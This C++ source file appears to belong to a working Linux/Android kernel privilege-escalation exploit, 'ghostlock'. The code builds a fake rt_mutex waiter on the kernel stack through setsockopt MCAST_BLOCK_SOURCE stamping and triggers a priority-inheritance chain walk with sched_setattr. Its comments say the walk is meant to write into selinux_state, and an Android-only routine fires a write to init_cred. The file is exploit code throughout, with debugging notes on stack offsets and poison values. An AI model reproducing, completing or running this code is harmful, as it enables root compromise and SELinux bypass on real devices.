#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_status.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

namespace ghostlock::route {
    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        (void) request;
        support::spray_breadcrumb("mcast entry");
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* TEMP(geometry-scan-01): the distance between the futex waiter frame
         * and the MCAST_BLOCK_SOURCE copy has never been verified on this
         * image, and even an offset-agnostic uniform craft still faulted at
         * rt_mutex_adjust_prio_chain+0x180, i.e. `waiter->lock` never read our
         * page. Sweep the landing without repackaging the asset profile:
         * `<home>/.ghostlock_geometry_probe` carries one "0x.." line with the
         * waiter offset to use instead of the profile value. */
        {
            char probe_path[320];
            (void) snprintf(probe_path, sizeof(probe_path), "%s/.ghostlock_geometry_probe",
                            config::runtime_config_snapshot().home_dir.c_str());
            const int probe_fd = open(probe_path, O_RDONLY | O_CLOEXEC);
            if (probe_fd >= 0) {
                char probe_buf[32];
                const ssize_t probe_len = read(probe_fd, probe_buf, sizeof(probe_buf) - 1);
                (void) close(probe_fd);
                if (probe_len > 0) {
                    probe_buf[probe_len] = '\0';
                    const unsigned long probe_value = strtoul(probe_buf, nullptr, 0);
                    if (probe_value != 0 && probe_value < stamp_size) {
                        layout.waiter_offset = static_cast<size_t>(probe_value);
                        pr_info("[mcast] geometry probe waiter_off=%zu\n",
                                static_cast<size_t>(probe_value));
                        support::log_sync();
                    }
                }
            }
        }
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        const memory::WriteRequest route_request = request
                ? *request
                : memory::WriteRequest::make(0, memory::WriteMode::Disabled, true);
        const memory::PayloadWriteLayout route_layout = memory::payload_write_layout(
            &route_request,
            session::g_exploit_session.heap.current.base,
            session::g_exploit_session.heap.current.fake_fops,
            session::g_exploit_session.heap.current.fake_fops,
            session::g_exploit_session.heap.current.fake_right);
        if (!memory::encode_multicast_waiter_5_10(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
            *layout.lock_offset, route_request, route_layout,
            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock),
            kernel::FAKE_WAITER_PRIO)) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            return status;
        }
        /* TEMP(geo-probe-01): graded poison. Every 8-byte slot of the stamp
         * window gets its own unmapped value 0xdead0000 + slot_index, so a
         * fault at rt_mutex_adjust_prio_chain+0x180 reports the slot the kernel
         * read as waiter->lock (fault address == 0xdead0000 + i; slot 1 reads
         * back as 0xdead00000000 because sa_family overwrites its low half).
         * Slot i sits at stamp offset 8*i, so the measured waiter_offset is
         * 8*i - 0x38. This replaces the assumed geometry with a measurement.
         * No fault at all => pi_blocked_on does not point into the copied
         * window, i.e. there is no dangling waiter to consume. */
        {
            constexpr int32_t geo_probe_graded = 1;
            if (geo_probe_graded != 0) {
                size_t slot = 0;
                for (size_t off = 0; off + sizeof(uint64_t) <= stamp_size;
                     off += sizeof(uint64_t), ++slot) {
                    const uint64_t poison = 0xdead0000ULL + slot;
                    memcpy(stamp + off, &poison, sizeof(uint64_t));
                }
                char geo[64];
                (void) snprintf(geo, sizeof(geo), "mcast graded poison slots=%zu",
                                slot);
                support::spray_breadcrumb(geo);
            }
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));
        /* TEMP(walk-poison-01): kept as a switch only. With 1 the lock word is
         * made unmapped so a walk proves itself with a panic; with 0 the real
         * crafted lock is used (this is the arming value). */
        {
            constexpr int32_t walk_poison_on = 0;
            if (walk_poison_on != 0) {
                const size_t lock_off = static_cast<size_t>(*layout.waiter_offset) +
                                        static_cast<size_t>(*layout.lock_offset);
                if (lock_off + sizeof(uint64_t) <= stamp_size) {
                    const uint64_t poison = 0xdead0000ULL;
                    memcpy(stamp + lock_off, &poison, sizeof(poison));
                    support::spray_breadcrumb("mcast poison");
                }
            }
        }
        support::spray_breadcrumb("mcast encoded");
        /* Craft provenance: the walk only survives if every pointer in the
         * overlay still resolves. Record the page and the words the encoder
         * used so a panic can be matched against them instead of guessed. */
        {
            char craft[420];
            const memory::PayloadPage &page = session::g_exploit_session.heap.current;
            (void) snprintf(craft, sizeof(craft),
                            "mcast craft base=%llx task=%llx lock=%llx right=%llx "
                            "fops=%llx lay_par=%llx lay_r=%llx lay_l=%llx tgt=%llx "
                            "offs=%zu,%zu,%zu buf=%zu",
                            static_cast<unsigned long long>(page.base),
                            static_cast<unsigned long long>(page.fake_task),
                            static_cast<unsigned long long>(page.fake_lock),
                            static_cast<unsigned long long>(page.fake_right),
                            static_cast<unsigned long long>(page.fake_fops),
                            static_cast<unsigned long long>(route_layout.parent),
                            static_cast<unsigned long long>(route_layout.right),
                            static_cast<unsigned long long>(route_layout.left),
                            static_cast<unsigned long long>(route_request.target),
                            static_cast<size_t>(*layout.waiter_offset),
                            static_cast<size_t>(*layout.task_offset),
                            static_cast<size_t>(*layout.lock_offset), stamp_size);
            support::spray_breadcrumb(craft);
            pr_info("[mcast] %s\n", craft);
            support::log_sync();
        }

        int32_t fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            status.step = 60;
            status.error_number = errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        support::spray_breadcrumb("mcast socket");
        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        support::spray_breadcrumb("mcast pre-copy");

        /* TEMP(offset-sweep-01): slide the copy window relative to the parked
         * WAIT frame. Both syscalls normally run at the same userspace depth, so
         * the copy always starts 0x358 above the futex entry sp; adding delta
         * here moves the window down by delta and lets a single-slot poison tell
         * us where the kernel's rt_mutex_waiter really is (a fault at
         * rt_mutex_adjust_prio_chain+0x180 means the poison hit waiter->lock). */
        {
            const std::string extra_file =
                    config::runtime_config_snapshot().home_dir + "/.ghostlock_frame_shift_extra";
            /* The waiter thread lowers its futex entry sp by the same amount
             * (threads.cpp kFrameShiftDefault) so both syscalls run at the same
             * address; this window must use the SAME shift or the copy misses the
             * dead rt_waiter by exactly the shift. */
            unsigned long long shift = 0x4c0ULL;
            {
                const std::string base_file =
                        config::runtime_config_snapshot().home_dir + "/.ghostlock_frame_shift";
                char base_line[32] = {};
                support::read_first_line(base_file.c_str(), base_line, sizeof(base_line));
                if (base_line[0] != '\0' && std::strncmp(base_line, "unreadable", 10) != 0) {
                    const unsigned long long parsed = strtoull(base_line, nullptr, 0);
                    shift = parsed > 2048ULL ? 2048ULL : parsed;
                }
            }
            char extra_line[32] = {};
            support::read_first_line(extra_file.c_str(), extra_line, sizeof(extra_line));
            /* Signed adjustment so the window can be moved UP as well: the two
             * call paths differ by a small residual (measured 0x40) that only a
             * negative delta can cancel. */
            if (extra_line[0] == '-' && (extra_line[1] == '0') && (extra_line[2] == 'x' || extra_line[2] == 'X')) {
                const long long drop = strtoll(extra_line, nullptr, 0);
                if (drop >= -16384 && static_cast<unsigned long long>(-drop) <= shift) {
                    shift -= static_cast<unsigned long long>(-drop);
                }
            } else if (extra_line[0] == '0' && (extra_line[1] == 'x' || extra_line[1] == 'X')) {
                const unsigned long long extra = strtoull(extra_line, nullptr, 0);
                if (extra <= 16384ULL) {
                    shift += extra;
                }
            }
            if (shift > 0x10000ULL) {
                shift = 0x10000ULL;
            }
            if (shift >= 8) {
                volatile unsigned char *slide =
                        static_cast<volatile unsigned char *>(__builtin_alloca(shift));
                slide[0] = static_cast<unsigned char>(shift);
                __asm__ volatile("" ::"r"(slide) : "memory");
            }
        }
        /* TEMP(frame-shift-03): the sp must be read AFTER the frame-shift
         * alloca above, otherwise the printed value is the pre-shift stack and
         * every geometry computation (and every offset experiment) is off by
         * the shift itself. This is the number that must match "waiter sp=". */
        {
            uintptr_t sp_sock = 0;
            __asm__ volatile("mov %0, sp" : "=r"(sp_sock));
            char sp_line[64] = {};
            (void)snprintf(sp_line, sizeof(sp_line), "mcast sp=0x%llx",
                           static_cast<unsigned long long>(sp_sock));
            support::spray_breadcrumb(sp_line);
        }
        int32_t stamp_result =
                setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
        support::spray_breadcrumb("mcast post-copy");
        /* TEMP(self-walk-02): fire the walk on the WAITER thread, right after
         * the copy that plants the craft. The dangle lives on the waiter: the
         * failed requeue runs remove_waiter() in THIS thread's context, which
         * dequeue()s the waiter and then clears `current->pi_blocked_on` --
         * current is the requeuer, so the waiter keeps a pi_blocked_on pointing
         * at the dequeue()'d rt_waiter on its own dead futex stack. Firing the
         * walk on ourselves (TEMP self-walk-01) hit that cleared field and
         * returned 0 without a write, which is why it looked like "no dangle".
         * A wrong waiter_off still faults at +0x180; a right one lets the chain
         * walk write into selinux_state before the next breadcrumb lands. */
        {
            int32_t walk_tid = session::g_exploit_session.race.waiter_tid.load();
            const int32_t self_tid = static_cast<int32_t>(syscall(SYS_gettid));
            if (walk_tid <= 0) walk_tid = self_tid;
            char walk_head[96];
            (void) snprintf(walk_head, sizeof(walk_head), "mcast walk tid=%d (self=%d)",
                            static_cast<int>(walk_tid), static_cast<int>(self_tid));
            support::spray_breadcrumb(walk_head);
            const long walk_ret = support::sched_setattr_tid(walk_tid, 1);
            const int32_t walk_errno = errno;
            char walk_line[96];
            (void) snprintf(walk_line, sizeof(walk_line), "mcast walked ret=%ld errno=%d",
                            walk_ret, static_cast<int>(walk_errno));
            support::spray_breadcrumb(walk_line);
            pr_info("[mcast] %s\n", walk_line);
            support::log_sync();
        }
        status.step = 61;
        status.error_number = errno;
        support::spray_breadcrumb("mcast fire");
        session::g_exploit_session.race.consumer_go.store(1);
        /* TEMP(craft-window-01): the copy plants the craft on THIS thread's
         * kernel stack, and every later syscall deeper than waiter_off rewrites
         * those words. nanosleep's chain (__arm64_sys_nanosleep + hrtimer_nanosleep
         * + do_nanosleep) is deeper than waiter_off, so the previous
         * stamp-then-park cadence erased the craft exactly while the consumer was
         * firing, and the walk read garbage at waiter->lock (+0x38). Restamp,
         * then idle in user space: nothing touches the frame while the walk
         * reads it, and each round re-plants the words. */
        for (int32_t round = 0;
             round < 200000 && session::g_exploit_session.race.consumer_calls.load() == 0;
             round++) {
            (void) setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
            for (int32_t spin = 0;
                 spin < 2000 && session::g_exploit_session.race.consumer_calls.load() == 0; ++spin) {
                __asm__ volatile ("" ::: "memory");
            }
        }
        session::g_exploit_session.race.consumer_go.store(0);
        while (session::g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (


        "yield"
        ::: "memory");
        close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace ghostlock::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        if (!support::activate_prebuilt_page()) {
            pr_warning("W2 fast repair activation failed\n");
            return false;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace ghostlock::route
#endif
